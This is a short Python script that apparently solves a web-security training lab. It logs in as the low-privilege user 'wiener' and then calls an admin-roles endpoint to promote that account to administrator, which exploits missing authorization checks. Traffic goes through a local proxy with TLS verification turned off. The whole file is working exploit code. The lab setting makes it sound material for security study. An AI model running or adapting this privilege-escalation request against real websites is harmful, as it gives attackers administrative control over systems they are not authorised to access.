import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def elevate_user(s, url):
    # Login to normal user
    login_url = url+ "/login"
    r3 = s.post(login_url, data={"username":"wiener", "password": "peter"}, verify=False, proxies=proxies)
    
    login_check_url = url + "/my-account?id=wiener"
    r4 = s.get(login_check_url, verify=False, proxies=proxies)

    if "Your username is: wiener" in r4.text:
        print("(+) Login to user wiener successful")
        # Promote user wiener to administrator
        elevate_user_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(elevate_user_url, verify=False, proxies=proxies)

        r2 = s.get(url, verify=False, proxies=proxies)
        if "Congratulations, you solved the lab!" in r2.text:
            print("(+) User elevated successfully")
        else:
            print("(-) User elevation failed")
    else:
        print("(-) Login to user wiener failed")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    elevate_user(s, url)

if (__name__ == '__main__'):
    main()